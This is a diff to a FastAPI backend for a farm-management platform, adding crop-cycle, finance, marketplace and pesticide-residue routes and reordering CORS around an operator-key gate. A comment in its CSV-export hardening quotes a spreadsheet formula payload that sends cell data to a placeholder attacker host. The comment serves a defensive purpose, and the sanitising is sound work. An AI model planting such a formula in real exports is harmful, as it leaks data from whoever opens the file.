@@ -14,8 +14,22 @@ from sqlalchemy.orm import Session
 
 from app import (
     ai_brief, clock, crud, csv_import, decision_status, disease_risk, extraction,
-    label_extraction, llm, models, operator_key, pca_authority, schemas, vision,
+    label_extraction, llm, models, operator_key, pca_authority, schemas,
+    value_ledger, vision,
 )
+# The layers admitted on 2026-08-07. Every one of these ships with an EMPTY transcription
+# source, so each entry point below returns a Refusal until someone reads a document —
+# see app/transcription.py and TRANSCRIPTION_TASKS.md.
+from app import (
+    collateral, credit_scoring, farm_profile, fertilization, hedging, insurance,
+    irrigation, land_selection, monitoring, pricing, rfq_transport, seed_selection,
+    soil, transcription,
+)
+# The first EMPIRICAL reference layer: USDA PDP measured residues. Unlike the layers
+# above it ships with real loaded data when an operator has run `python -m app.pdp_sync`,
+# and refuses with a specific code when they have not — see app/residue_reference.py.
+from app import residue_reference
+from app.ingest import domains as ingest_domains
 from app.analytics import compute_cost_analytics
 # Imported for its side effect: registering the feature specs and their job handlers.
 from app import features as _features  # noqa: F401
@@ -49,15 +63,6 @@ app = FastAPI(
     version="0.2.0",
 )
 
-# Allow the local Next.js dev server to call the API.
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["http://localhost:3000", "http://127.0.0.1:3000"],
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
-
-
 @app.middleware("http")
 async def _operator_key_middleware(request, call_next):
     """Gate every /internal path behind the deployment's operator key.
@@ -69,7 +74,23 @@ async def _operator_key_middleware(request, call_next):
 
     No-ops when LUMOS_OPERATOR_KEY is unset (demo/local development); `_startup`
     refuses to boot in that state once the database holds real records.
+
+    CORS PREFLIGHT IS EXEMPT, and it has to be. A browser never sends custom headers
+    on an `OPTIONS` preflight — the spec forbids it — so a preflight for any
+    key-bearing request arrives here with no `X-Lumos-Operator-Key` and used to be
+    refused 403. The browser then never sent the real request, and every /internal
+    call from the UI failed with an opaque "Failed to fetch". That made the whole
+    operator surface unusable from a browser on exactly the deployments where the key
+    is mandatory (i.e. any database holding real records).
+
+    Exempting preflight does not weaken the gate: a preflight carries no credentials
+    and returns no data, and the ACTUAL request that follows still passes through here
+    and still needs a valid key. Verified by
+    `test_a_preflight_is_answered_but_the_real_request_still_needs_the_key`.
     """
+    if request.method == "OPTIONS":
+        return await call_next(request)
+
     if request.url.path.startswith("/internal"):
         reason = operator_key.denial_reason(
             request.headers.get(operator_key.KEY_HEADER)
@@ -80,6 +101,27 @@ async def _operator_key_middleware(request, call_next):
                 content={"detail": operator_key.DENIAL_MESSAGES.get(reason, reason)},
             )
     return await call_next(request)
+
+
+# Allow the local Next.js dev server to call the API.
+#
+# REGISTERED LAST ON PURPOSE, and the order is load-bearing. Starlette runs the
+# most-recently-added middleware OUTERMOST, so adding CORS after the operator gate puts
+# CORS *outside* it. That matters because the gate short-circuits with a 403: if CORS
+# were inner, it would never run on that path, the 403 would carry no
+# `access-control-allow-origin`, and a browser would discard it and report an opaque
+# "Failed to fetch" instead of the actual message.
+#
+# The message is the whole point — "this route requires the X-Lumos-Operator-Key
+# header" is what tells an operator their key is missing or wrong. Ordering it this way
+# is what lets them see it. Pinned by
+# `test_a_denied_internal_request_still_carries_cors_headers`.
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["http://localhost:3000", "http://127.0.0.1:3000"],
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
 
 
 # Demo/real mixing is rejected wherever a record is created (several crud entry
@@ -777,6 +819,186 @@ def get_block_outcomes(
     return crud.list_block_outcomes(db, farm_id, block_id)
 
 
+# --------------------------------------------------------------- Crop cycles
+# The season as a queryable thing. `CropCycle` and `Operation` were modelled in the
+# entity-spine phase and had no route at all until now, so nothing could be
+# attributed to a season and the value ledger had no scope to compute over.
+@app.post(
+    "/farms/{farm_id}/crop-cycles",
+    response_model=schemas.CropCycle,
+    status_code=201,
+    tags=["crop-cycles"],
+)
+def post_crop_cycle(
+    farm_id: int, payload: schemas.CropCycleCreate, db: Session = Depends(get_db)
+):
+    farm = _require_farm(db, farm_id)
+    cycle = crud.create_crop_cycle(db, farm, payload)
+    # Records already on the farm that fall inside the new cycle's window are
+    # attached immediately — otherwise a grower who creates a season mid-flight
+    # sees an empty ledger beside a full spray log and concludes it is broken.
+    crud.link_records_to_cycle(db, cycle)
+    return cycle
+
+
+@app.get(
+    "/farms/{farm_id}/crop-cycles",
+    response_model=list[schemas.CropCycle],
+    tags=["crop-cycles"],
+)
+def get_crop_cycles(farm_id: int, db: Session = Depends(get_db)):
+    _require_farm(db, farm_id)
+    return crud.list_crop_cycles(db, farm_id)
+
+
+def _require_crop_cycle(db: Session, cycle_id: int):
+    cycle = crud.get_crop_cycle(db, cycle_id)
+    if cycle is None:
+        raise HTTPException(status_code=404, detail="Crop cycle not found")
+    return cycle
+
+
+@app.get("/crop-cycles/{cycle_id}", response_model=schemas.CropCycle, tags=["crop-cycles"])
+def get_crop_cycle(cycle_id: int, db: Session = Depends(get_db)):
+    return _require_crop_cycle(db, cycle_id)
+
+
+@app.patch(
+    "/crop-cycles/{cycle_id}", response_model=schemas.CropCycle, tags=["crop-cycles"]
+)
+def patch_crop_cycle(
+    cycle_id: int, payload: schemas.CropCycleUpdate, db: Session = Depends(get_db)
+):
+    """Update a cycle — most often to close it once harvest is finished."""
+    cycle = _require_crop_cycle(db, cycle_id)
+    return crud.update_crop_cycle(db, cycle, payload)
+
+
+@app.post("/crop-cycles/{cycle_id}/link-records", tags=["crop-cycles"])
+def post_link_records(cycle_id: int, db: Session = Depends(get_db)):
+    """Attach unlinked farm records that fall inside this cycle's window.
+
+    Only touches rows whose `crop_cycle_id` is NULL, so a record already attributed
+    to a season is never moved between them.
+    """
+    cycle = _require_crop_cycle(db, cycle_id)
+    return {"crop_cycle_id": cycle.id, "linked": crud.link_records_to_cycle(db, cycle)}
+
+
+@app.post(
+    "/crop-cycles/{cycle_id}/operations",
+    response_model=schemas.Operation,
+    status_code=201,
+    tags=["crop-cycles"],
+)
+def post_operation(
+    cycle_id: int, payload: schemas.OperationCreate, db: Session = Depends(get_db)
+):
+    """Record a non-spray operation and its cost. Applications keep their own table."""
+    cycle = _require_crop_cycle(db, cycle_id)
+    return crud.create_operation(db, cycle, payload)
+
+
+@app.get(
+    "/farms/{farm_id}/operations",
+    response_model=list[schemas.Operation],
+    tags=["crop-cycles"],
+)
+def get_operations(
+    farm_id: int, crop_cycle_id: int | None = None, db: Session = Depends(get_db)
+):
+    _require_farm(db, farm_id)
+    return crud.list_operations(db, farm_id, crop_cycle_id)
+
+
+# ----------------------------------------------------------- Sales and economics
+@app.post(
+    "/crop-cycles/{cycle_id}/sales",
+    response_model=schemas.SaleRecord,
+    status_code=201,
+    tags=["crop-cycles"],
+)
+def post_sale_record(
+    cycle_id: int, payload: schemas.SaleRecordCreate, db: Session = Depends(get_db)
+):
+    """Record a sale or settlement against a crop cycle.
+
+    Append-only: there is no PATCH and no DELETE. A corrected settlement is a new row
+    carrying `supersedes_id`, so the revenue a grower saw when they closed the season
+    is still readable afterwards.
+    """
+    cycle = _require_crop_cycle(db, cycle_id)
+    return crud.create_sale_record(db, cycle, payload)
+
+
+@app.get(
+    "/crop-cycles/{cycle_id}/sales",
+    response_model=list[schemas.SaleRecord],
+    tags=["crop-cycles"],
+)
+def get_sale_records(cycle_id: int, db: Session = Depends(get_db)):
+    _require_crop_cycle(db, cycle_id)
+    return crud.list_sale_records(db, cycle_id)
+
+
+@app.get("/crop-cycles/{cycle_id}/closeout", tags=["crop-cycles"])
+def get_crop_cycle_closeout(cycle_id: int, db: Session = Depends(get_db)):
+    """What this season cost, produced, sold for, and what value Lumos can attribute.
+
+    Serves an OPEN cycle and a CLOSED one identically — the payload's `view` field
+    says which framing applies (`season_to_date` / `season_closeout`) and nothing else
+    changes, because a grower mid-season needs the same figures as one closing the
+    books and two surfaces would eventually disagree.
+
+    Farm-record economics, not accounting: every figure is built from records entered
+    on this cycle, and a metric that cannot be computed omits its value key entirely
+    rather than reporting a zero.
+    """
+    cycle = _require_crop_cycle(db, cycle_id)
+    return crud.build_crop_cycle_closeout(db, cycle)
+
+
+# --------------------------------------------------------------- Value ledger
+@app.get("/farms/{farm_id}/value-ledger", tags=["value"])
+def get_value_ledger(
+    farm_id: int, crop_cycle_id: int | None = None, db: Session = Depends(get_db)
+):
+    """The loop: what Lumos recommended, what was done, what happened, what it was worth.
+
+    Verified and estimated totals are returned separately and are never added
+    together, and every row carries the sentence explaining its own arithmetic. A
+    row with nothing attributable carries `not_calculated_reason` and no amount —
+    the `value` key is omitted rather than nulled, so no template can render it
+    as a zero.
+    """
+    farm = _require_farm(db, farm_id)
+    if crop_cycle_id is not None:
+        cycle = _require_crop_cycle(db, crop_cycle_id)
+        if cycle.farm_id != farm_id:
+            raise HTTPException(
+                status_code=404, detail="That crop cycle belongs to a different farm"
+            )
+    return crud.build_value_ledger(db, farm, crop_cycle_id)
+
+
+@app.get("/planned-sprays/{planned_id}/economics", tags=["value"])
+def get_decision_economics(planned_id: int, db: Session = Depends(get_db)):
+    """The direct cost of each choice open on one decision.
+
+    A SEPARATE route, deliberately: nothing is added to the decision payload itself,
+    which is what the Botrytis shadow study's blinding depends on. Direct recorded
+    costs only — no probabilities and no rescue-rate model, because this farm's
+    history is nowhere near large enough to support one.
+    """
+    planned = crud.get_planned_spray(db, planned_id)
+    if planned is None:
+        raise HTTPException(status_code=404, detail="Planned spray not found")
+    farm = crud.get_farm(db, planned.farm_id)
+    return value_ledger.decision_economics(
+        planned, currency=value_ledger.currency_for(farm)
+    )
+
+
 @app.get(
     "/internal/pilot/assessments",
     response_model=list[schemas.DiseaseRiskAssessment],
@@ -785,6 +1007,67 @@ def get_block_outcomes(
 def get_shadow_assessments(farm_id: int | None = None, db: Session = Depends(get_db)):
     """The ONLY surface that returns shadow assessments before unblinding."""
     return crud.list_shadow_assessments(db, farm_id)
+
+
+@app.post(
+    "/internal/farms/{farm_id}/opportunity-scans",
+    response_model=schemas.OpportunityScan,
+    status_code=201,
+    tags=["internal"],
+)
+def post_opportunity_scan(
+    farm_id: int,
+    payload: schemas.OpportunityScanCreate,
+    db: Session = Depends(get_db),
+):
+    """Replay a past season's scheduled spray dates for one block (pilot ladder Stage 2).
+
+    INTERNAL on purpose, and for a different reason than most `/internal` routes. This
+    is not merely operator tooling: a risk histogram reaching a PCA who is enrolled in
+    the blinded shadow study would contaminate the baseline their dispositions exist to
+    provide. It stays behind the operator key for as long as any farm is in shadow.
+
+    Returns the histogram together with `cannot_conclude` — the scan cannot be received
+    without its claim ceiling.
+    """
+    _require_farm(db, farm_id)
+    try:
+        return crud.run_opportunity_scan(
+            db,
+            farm_id,
+            payload.block_id,
+            payload.decision_dates,
+            horizon_hours=payload.horizon_hours,
+            lookback_hours=payload.lookback_hours,
+            run_by=payload.run_by,
+        )
+    except crud.CrossFarmReferenceError as exc:
+        raise HTTPException(status_code=409, detail=str(exc))
+    except ValueError as exc:
+        raise HTTPException(status_code=422, detail=str(exc))
+
+
+@app.get(
+    "/internal/opportunity-scans",
+    response_model=list[schemas.OpportunityScan],
+    tags=["internal"],
+)
+def get_opportunity_scans(
+    farm_id: int | None = None, limit: int = 50, db: Session = Depends(get_db)
+):
+    return crud.list_opportunity_scans(db, farm_id, limit)
+
+
+@app.get(
+    "/internal/opportunity-scans/{scan_id}",
+    response_model=schemas.OpportunityScan,
+    tags=["internal"],
+)
+def get_opportunity_scan(scan_id: int, db: Session = Depends(get_db)):
+    scan = crud.get_opportunity_scan(db, scan_id)
+    if scan is None:
+        raise HTTPException(status_code=404, detail="Opportunity scan not found")
+    return scan
 
 
 def _require_planned_spray(db: Session, planned_id: int):
@@ -2387,6 +2670,379 @@ def internal_jobs(
     }
 
 
+# ------------------------------------------------------- Finance persistence
+# Recording an assessment is an operator act (it is a consequential record about a real
+# person's farm), so the POSTs are operator-gated. READING a farm's own assessment
+# history is grower-facing — "why was I declined" is their question, and the refusal
+# rows are the part they most need to see.
+@app.post("/internal/farms/{farm_id}/credit-assessments", status_code=201,
+          tags=["internal"])
+def internal_record_credit_assessment(
+    farm_id: int, assessed_by: str | None = None, db: Session = Depends(get_db)
+):
+    """INTERNAL: run the transcribed scorecard and STORE the result — or the refusal.
+
+    With no scorecard transcribed this stores a refusal every time, which is the point:
+    "could not score, no scorecard supplied, on this date" is a materially different
+    history from an empty one, and it is the record that protects both sides.
+    """
+    _require_farm(db, farm_id)
+    row = crud.record_credit_assessment(db, farm_id, assessed_by=assessed_by)
+    return schemas.CreditAssessment.model_validate(row)
+
+
+@app.get("/farms/{farm_id}/credit-assessments", tags=["finance"])
+def farm_credit_assessments(farm_id: int, db: Session = Depends(get_db)):
+    """A farm's full assessment history, newest first, INCLUDING refusals.
+
+    Append-only: nothing here was ever edited or deleted, so what a lender saw on a
+    given date stays recoverable. `inputs_digest` is what makes that checkable rather
+    than merely claimed.
+    """
+    _require_farm(db, farm_id)
+    return [
+        schemas.CreditAssessment.model_validate(a)
+        for a in crud.list_credit_assessments(db, farm_id)
+    ]
+
+
+@app.post("/internal/farms/{farm_id}/underwriting-decisions", status_code=201,
+          tags=["internal"])
+def internal_record_underwriting_decision(
+    farm_id: int, payload: schemas.UnderwritingRequest, db: Session = Depends(get_db)
+):
+    """INTERNAL: evaluate the transcribed policy and store the outcome.
+
+    The outcome is never "approved" — there is no such value in the vocabulary and no
+    column that could hold one. Storing an evaluation does not make it a commitment.
+    """
+    _require_farm(db, farm_id)
+    row = crud.record_underwriting_decision(
+        db, farm_id, exposure_amount=payload.exposure_amount,
+        evidence_keys=payload.evidence_keys, decided_by=payload.decided_by,
+    )
+    return schemas.UnderwritingDecision.model_validate(row)
+
+
+@app.get("/farms/{farm_id}/underwriting-decisions", tags=["finance"])
+def farm_underwriting_decisions(farm_id: int, db: Session = Depends(get_db)):
+    _require_farm(db, farm_id)
+    return [
+        schemas.UnderwritingDecision.model_validate(d)
+        for d in crud.list_underwriting_decisions(db, farm_id)
+    ]
+
+
+@app.post("/internal/farms/{farm_id}/collateral", status_code=201, tags=["internal"])
+def internal_register_collateral(
+    farm_id: int, payload: schemas.CollateralAssetCreate, db: Session = Depends(get_db)
+):
+    """INTERNAL: register or revalue a collateral asset.
+
+    Append-only: pass `supersedes_id` to revalue, which keeps what the asset was
+    assessed at when an earlier decision referenced it.
+    """
+    _require_farm(db, farm_id)
+    row = crud.register_collateral_asset(db, farm_id, payload)
+    return schemas.CollateralAsset.model_validate(row)
+
+
+@app.get("/farms/{farm_id}/collateral", tags=["finance"])
+def farm_collateral(farm_id: int, db: Session = Depends(get_db)):
+    """LIVE assets only — superseded rows are excluded so a revaluation cannot
+    double-count the same asset in a total."""
+    _require_farm(db, farm_id)
+    return [
+        schemas.CollateralAsset.model_validate(a)
+        for a in crud.list_collateral_assets(db, farm_id)
+    ]
+
+
+@app.post("/internal/farms/{farm_id}/monitoring-snapshots", status_code=201,
+          tags=["internal"])
+def internal_record_monitoring_snapshot(farm_id: int, db: Session = Depends(get_db)):
+    """INTERNAL: evaluate the covenant schedule and store the standing.
+
+    `standing` is three-valued, and `unknown` is the common answer. A farm with an
+    unevaluated covenant is NOT in good standing — nobody looked at all of it.
+    """
+    _require_farm(db, farm_id)
+    row = crud.record_monitoring_snapshot(db, farm_id)
+    return schemas.MonitoringSnapshot.model_validate(row)
+
+
+@app.get("/farms/{farm_id}/monitoring-snapshots", tags=["finance"])
+def farm_monitoring_snapshots(farm_id: int, db: Session = Depends(get_db)):
+    _require_farm(db, farm_id)
+    return [
+        schemas.MonitoringSnapshot.model_validate(s)
+        for s in crud.list_monitoring_snapshots(db, farm_id)
+    ]
+
+
+@app.post("/internal/farms/{farm_id}/coverage-assessments", status_code=201,
+          tags=["internal"])
+def internal_record_coverage_assessment(
+    farm_id: int, payload: schemas.CoverageAssessmentRequest,
+    db: Session = Depends(get_db),
+):
+    """INTERNAL: match transcribed insurance products and store the result. No premium."""
+    _require_farm(db, farm_id)
+    row = crud.record_coverage_assessment(
+        db, farm_id, crop=payload.crop, peril=payload.peril,
+        evidence_keys=payload.evidence_keys, assessed_by=payload.assessed_by,
+    )
+    return schemas.CoverageAssessment.model_validate(row)
+
+
+@app.get("/farms/{farm_id}/coverage-assessments", tags=["finance"])
+def farm_coverage_assessments(farm_id: int, db: Session = Depends(get_db)):
+    _require_farm(db, farm_id)
+    return [
+        schemas.CoverageAssessment.model_validate(c)
+        for c in crud.list_coverage_assessments(db, farm_id)
+    ]
+
+
+# ------------------------------------------------------------------- Marketplace
+# Supplier and catalogue registration is operator work (concierge, like quote entry),
+# so it sits under /internal. Dispersion and transmission history are grower-facing:
+# what suppliers quoted, and whether anyone was actually contacted, belong to the
+# person whose plan it is.
+@app.post("/internal/suppliers", response_model=schemas.Supplier, status_code=201,
+          tags=["internal"])
+def internal_create_supplier(
+    payload: schemas.SupplierCreate, db: Session = Depends(get_db)
+):
+    """INTERNAL: register a supplier as an entity rather than a string on each quote."""
+    return crud.create_supplier(db, payload)
+
+
+@app.get("/internal/suppliers", tags=["internal"])
+def internal_list_suppliers(
+    include_inactive: bool = False, db: Session = Depends(get_db)
+):
+    """INTERNAL: suppliers in registration order.
+
+    NOT ranked and not sorted by any quality or price signal — ordering a supplier list
+    is a recommendation, and Lumos does not make one.
+    """
+    return [
+        schemas.Supplier.model_validate(s)
+        for s in crud.list_suppliers(db, include_inactive=include_inactive)
+    ]
+
+
+@app.post("/internal/input-products", response_model=schemas.InputProduct,
+          status_code=201, tags=["internal"])
+def internal_create_input_product(
+    payload: schemas.InputProductCreate, db: Session = Depends(get_db)
+):
+    """INTERNAL: add a product to the catalogue.
+
+    The catalogue is what makes price comparison possible at all — quote lines carry
+    free text, and grouping three spellings of one product reports three products with
+    no spread each.
+    """
+    return crud.create_input_product(db, payload)
+
+
+@app.get("/internal/input-products", tags=["internal"])
+def internal_list_input_products(db: Session = Depends(get_db)):
+    return [
+        schemas.InputProduct.model_validate(p) for p in crud.list_input_products(db)
+    ]
+
+
+@app.post("/internal/suppliers/{supplier_id}/catalog",
+          response_model=schemas.SupplierProduct, status_code=201, tags=["internal"])
+def internal_link_supplier_product(
+    supplier_id: int, payload: schemas.SupplierProductCreate,
+    db: Session = Depends(get_db),
+):
+    """INTERNAL: record that a supplier offers a catalogued product. No price."""
+    if db.get(models.Supplier, supplier_id) is None:
+        raise HTTPException(status_code=404, detail="supplier not found")
+    return crud.link_supplier_product(db, supplier_id, payload)
+
+
+@app.get("/internal/suppliers/{supplier_id}/catalog", tags=["internal"])
+def internal_supplier_catalog(supplier_id: int, db: Session = Depends(get_db)):
+    if db.get(models.Supplier, supplier_id) is None:
+        raise HTTPException(status_code=404, detail="supplier not found")
+    return [
+        schemas.SupplierProduct.model_validate(c)
+        for c in crud.list_supplier_catalog(db, supplier_id)
+    ]
+
+
+@app.get("/rfq-transport", tags=["procurement"])
+def rfq_transport_status():
+    """Whether this deployment can transmit an RFQ to anybody.
+
+    Answers "did my request actually go anywhere". Today it always reports `can_send:
+    false` with the reason — no transport is configured, so RFQs are recorded as skipped
+    and a human sends them. Reported rather than hidden, because a submitted plan that
+    silently contacts nobody is the gap this endpoint exists to make visible.
+    """
+    return rfq_transport.describe().as_payload()
+
+
+@app.post("/input-plans/{plan_id}/transmit-rfq", status_code=201, tags=["procurement"])
+def transmit_rfq(
+    plan_id: int, payload: schemas.RfqTransmissionRequest,
+    db: Session = Depends(get_db),
+):
+    """Attempt to send this plan's RFQ to named suppliers, and record the outcome.
+
+    One append-only row per intended recipient, ALWAYS — including when nothing was
+    sent. Recipients are named explicitly rather than auto-selected: choosing who gets
+    asked to quote, on the grower's behalf, is a form of ranking.
+    """
+    plan = crud.get_input_plan(db, plan_id)
+    if plan is None:
+        raise HTTPException(status_code=404, detail="input plan not found")
+
+    rows = crud.record_rfq_transmissions(
+        db, plan, supplier_ids=payload.supplier_ids, requested_by=payload.requested_by
+    )
+    if not rows:
+        raise HTTPException(
+            status_code=404, detail="none of the supplied supplier_ids exist"
+        )
+    return [schemas.RfqTransmission.model_validate(r) for r in rows]
+
+
+@app.get("/input-plans/{plan_id}/transmissions", tags=["procurement"])
+def list_transmissions(plan_id: int, db: Session = Depends(get_db)):
+    if crud.get_input_plan(db, plan_id) is None:
+        raise HTTPException(status_code=404, detail="input plan not found")
+    return [
+        schemas.RfqTransmission.model_validate(r)
+        for r in crud.list_rfq_transmissions(db, plan_id)
+    ]
+
+
+@app.get("/input-plans/{plan_id}/price-dispersion", tags=["procurement"])
+def plan_price_dispersion(plan_id: int, db: Session = Depends(get_db)):
+    """How much each catalogued product varied in price across the suppliers who quoted.
+
+    This is what "better buying power" means concretely and honestly. It reports a
+    spread, not a saving and not a recommended supplier — a grower may have good reasons
+    to buy above the lowest quote, and calling the difference a saving assumes they did
+    not. Observations stay in entry order; sorting by price would make this a ranking in
+    everything but name.
+    """
+    if crud.get_input_plan(db, plan_id) is None:
+        raise HTTPException(status_code=404, detail="input plan not found")
+    return crud.price_dispersion_for_plan(db, plan_id).as_payload()
+
+
+# ------------------------------------------------- Transcription + cross-layer profile
+@app.get("/internal/transcription-status", tags=["internal"])
+def internal_transcription_status():
+    """INTERNAL: every EMPTY transcription source, and the document that would fill it.
+
+    The operator-facing counterpart to the eight admitted domains. Each source module
+    ships empty by design (see `app/transcription.py`), so this endpoint is the worklist:
+    it answers "what must someone go and read for the finance layer to produce anything",
+    which is a procurement-and-reading task, not a build task.
+
+    Generated from `domains.empty_sources()` rather than a hand-kept list, so a domain
+    admitted later cannot be forgotten here — the same reason the operator key middleware
+    gates on a path prefix rather than a route list.
+    """
+    statuses = [
+        transcription.status_of(module_path, title=ingest_domains.get(key).title)
+        for key, module_path in ingest_domains.empty_sources()
+    ]
+    return {
+        "admission": ingest_domains.ADMISSION,
+        "sources": [s.as_payload() for s in statuses],
+        "populated_count": sum(1 for s in statuses if s.populated),
+        "total_count": len(statuses),
+        "note": (
+            "A source is filled by transcribing a primary document WITH its citation, "
+            "never by recalling a plausible value. Every model over an empty source "
+            "returns a refusal naming the reason — that is the designed state, not a bug."
+        ),
+    }
+
+
+@app.get("/farms/{farm_id}/profile", tags=["farms"])
+def farm_cross_layer_profile(farm_id: int, db: Session = Depends(get_db)):
+    """Every layer's view of one farm, side by side, each computed or refused.
+
+    Grower-facing and deliberately NOT under `/internal`, for the same reason as
+    `/data-readiness`: "why can't this product tell me anything about X" is a question
+    that belongs to the person whose farm it is.
+
+    Deliberately NOT added to the PCA-facing decision surface. The Botrytis shadow study
+    depends on the reviewing PCA not seeing model output, and a cross-layer card on
+    `/decisions/{id}` would break the blinding.
+
+    On today's data nearly every layer refuses, and `blocking_gaps` — grouped by whether
+    a grower or an operator can unblock it — is the useful payload. That grouping is the
+    one genuinely cross-layer computation here; there is no overall score, because an
+    average across layers that mostly abstain is meaningless rather than merely rough.
+    """
+    farm = _require_farm(db, farm_id)
+    crop = farm.crop_type or "unknown"
+
+    # Each layer supplies its own result or its own refusal. Nothing is invented to fill
+    # a gap, and a layer that cannot answer says which document or record would let it.
+    views = [
+        (
+            farm_profile.LAYER_OPERATIONS, "Soil",
+            soil.interpret(crud.list_soil_readings(db, farm_id), crop=crop),
+        ),
+        (
+            farm_profile.LAYER_ADVISORY, "Nutrient budget",
+            fertilization.budget(
+                crop=crop,
+                expected_yield_tonnes=crud.expected_yield_tonnes(db, farm_id),
+                nutrients=("nitrogen", "potassium"),
+            ),
+        ),
+        (
+            farm_profile.LAYER_ADVISORY, "Variety traits",
+            seed_selection.traits_for(
+                variety=crud.primary_variety(db, farm_id) or "unknown", crop=crop
+            ),
+        ),
+        (
+            farm_profile.LAYER_FINANCE, "Credit score",
+            credit_scoring.score(
+                features=crud.feature_results_for_farm(db, farm_id),
+                as_of=clock.current_datetime(),
+            ),
+        ),
+        (
+            farm_profile.LAYER_FINANCE, "Collateral",
+            collateral.value_assets(
+                crud.list_collateral_assets(db, farm_id),
+                currency="USD" if farm.country == "US" else "TRY",
+            ),
+        ),
+        (
+            farm_profile.LAYER_FINANCE, "Covenant standing",
+            monitoring.evaluate(
+                features=crud.feature_results_for_farm(db, farm_id),
+                as_of=clock.current_datetime(),
+            ),
+        ),
+        (
+            farm_profile.LAYER_MARKET, "Reported price",
+            pricing.latest(
+                commodity=crop, market=farm.location or "unknown",
+                as_of=clock.current_date(), max_age_days=7,
+            ),
+        ),
+    ]
+
+    return farm_profile.build(farm_id=farm_id, views=views).as_payload()
+
+
 @app.get("/internal/ingestion/sources", tags=["internal"])
 def internal_ingestion_sources():
     """INTERNAL: every declared data source and the domain table governing it.
@@ -2433,11 +3089,34 @@ def create_pilot_feedback(
 
 
 # ------------------------------------------------------------------- Exports
+# Spreadsheet apps (Excel, LibreOffice Calc, Google Sheets) evaluate any cell whose
+# first character is one of these as a formula on open — so a free-text field a grower
+# typed (product name, notes, agronomist comment, pilot-feedback pain point) can carry
+# a payload like `=IMPORTXML("http://attacker/?leak="&A1,"//")` or a Windows DDE
+# process-launch string straight into the CSV a PCA downloads for compliance. These
+# exports are the whole point of the audit trail, so the recipient is exactly a
+# high-trust user opening the file. OWASP's fix: prefix a formula-triggering cell so the
+# spreadsheet treats it as text, never as a formula.
+_CSV_FORMULA_TRIGGERS = ("=", "+", "-", "@")
+
+
+def _sanitise_csv_cell(value):
+    """Neutralise CSV formula injection in string cells; pass other types through.
+
+    A leading tab keeps the value human-readable and round-trips as text rather than a
+    formula. Numbers and booleans cannot carry formula syntax, so they are untouched —
+    prefixing them would corrupt a legitimately numeric column.
+    """
+    if isinstance(value, str) and value[:1] in _CSV_FORMULA_TRIGGERS:
+        return "\t" + value
+    return value
+
+
 def _csv_response(filename: str, header: list[str], rows: list[list]) -> Response:
     buf = io.StringIO()
     writer = csv.writer(buf)
     writer.writerow(header)
-    writer.writerows(rows)
+    writer.writerows([_sanitise_csv_cell(cell) for cell in row] for row in rows)
     return Response(
         content=buf.getvalue(),
         media_type="text/csv",
@@ -2844,3 +3523,408 @@ def internal_post_order_event(
     /orders/{id}/input-applied link."""
     order = _require_purchase_order(db, order_id)
     return _procurement_call(crud.add_order_event, db, order, payload)
+
+
+# ---------------------------------------------------------------------------
+# Residue reference (USDA Pesticide Data Program)
+# ---------------------------------------------------------------------------
+
+@app.get("/residue-reference", tags=["labels"])
+def residue_reference_lookup(
+    crop: str,
+    active_ingredient: str,
+    db: Session = Depends(get_db),
+):
+    """Measured national residue findings for one (crop, active ingredient) pair.
+
+    Grower/PCA-facing, and deliberately NOT farm-scoped: PDP measures commodities
+    nationally, so there is no farm whose data this reflects. Taking a farm id would
+    imply the numbers describe that farm, which is precisely the misreading the payload
+    works to prevent.
+
+    Returns EITHER a profile OR a refusal with a code, never a zero-filled shape — the
+    `/data-readiness` rule (ENGINEERING_GUIDELINES.md §9). `pesticide_not_analysed` in particular must
+    reach the UI intact: "we did not measure this" and "we measured none" are opposite
+    facts, and only the refusal code distinguishes them.
+
+    Carries no verdict, no risk band, and no action, because `ResidueProfile` has no
+    field for one. It also stays OFF the PCA-facing decision payload: adding a national
+    residue statistic to `/decisions/{id}` would break the Botrytis shadow study's
+    blinding (ENGINEERING_GUIDELINES.md §5).
+    """
+    rows = crud.get_residue_reference_rows(db)
+    result = residue_reference.lookup(
+        crop=crop,
+        active_ingredient=active_ingredient,
+        rows=rows,
+        current_year=clock.current_date().year,
+    )
+
+    if isinstance(result, residue_reference.Refusal):
+        return {
+            "query": {"crop": crop, "active_ingredient": active_ingredient},
+            **result.as_payload(),
+            "disclaimer": residue_reference.RESIDUE_REFERENCE_DISCLAIMER,
+        }
+
+    payload = {
+        "query": {"crop": crop, "active_ingredient": active_ingredient},
+        "refused": False,
+        "crop": result.crop,
+        "commodity_name": result.commodity_name,
+        "active_ingredient": result.active_ingredient,
+        "program_year": result.program_year,
+        "years_since_program": result.years_since_program,
+        "samples_tested": result.samples_tested,
+        "samples_with_detection": result.samples_with_detection,
+        "detection_rate": result.detection_rate,
+        "domestic_only": result.domestic_only,
+        "authority": result.authority,
+        # Server-owned wording so a card renders it verbatim and the release year can
+        # never be dropped by a caller that only wanted the percentage.
+        "basis_text": residue_reference.basis_text(result),
+        "source_reference": result.source_reference,
+        "source_digest": result.source_digest,
+        "disclaimer": residue_reference.RESIDUE_REFERENCE_DISCLAIMER,
+    }
+
+    # Concentrations are omitted entirely when nothing was detected. A null
+    # `max_concentration` is what a template turns into 0, and "0 ppm detected" reads as
+    # a measurement rather than an absence.
+    if result.max_concentration is not None:
+        payload["max_concentration"] = result.max_concentration
+        payload["concentration_unit"] = result.concentration_unit
+    if result.median_detected_concentration is not None:
+        payload["median_detected_concentration"] = result.median_detected_concentration
+
+    # Same rule for the tolerance: a non-numeric basis (NT/EX/SU) carries its meaning as
+    # prose and never as a number.
+    if result.epa_tolerance_value is not None:
+        payload["epa_tolerance_value"] = result.epa_tolerance_value
+        payload["tolerance_unit"] = result.tolerance_unit
+    if result.epa_tolerance_basis is not None:
+        payload["epa_tolerance_basis"] = result.epa_tolerance_basis
+        payload["tolerance_note"] = result.tolerance_note
+    if result.max_as_share_of_tolerance is not None:
+        payload["max_as_share_of_tolerance"] = result.max_as_share_of_tolerance
+
+    return payload
+
+
+@app.get("/internal/residue-reference-coverage", tags=["internal"])
+def internal_residue_reference_coverage(db: Session = Depends(get_db)):
+    """Which PDP releases and commodities are loaded — the operator's coverage view.
+
+    Under `/internal` so `app/operator_key.py`'s path-prefix middleware gates it by
+    construction, rather than by a per-route dependency someone can forget.
+    It answers "what should I load next", which is an operator task.
+    The grower-facing route above already explains any individual gap through its
+    refusal code.
+    """
+    return {
+        **crud.residue_reference_coverage(db),
+        "loader": "python -m app.pdp_sync <year>PDPDatabase.zip --crops strawberry,tomato",
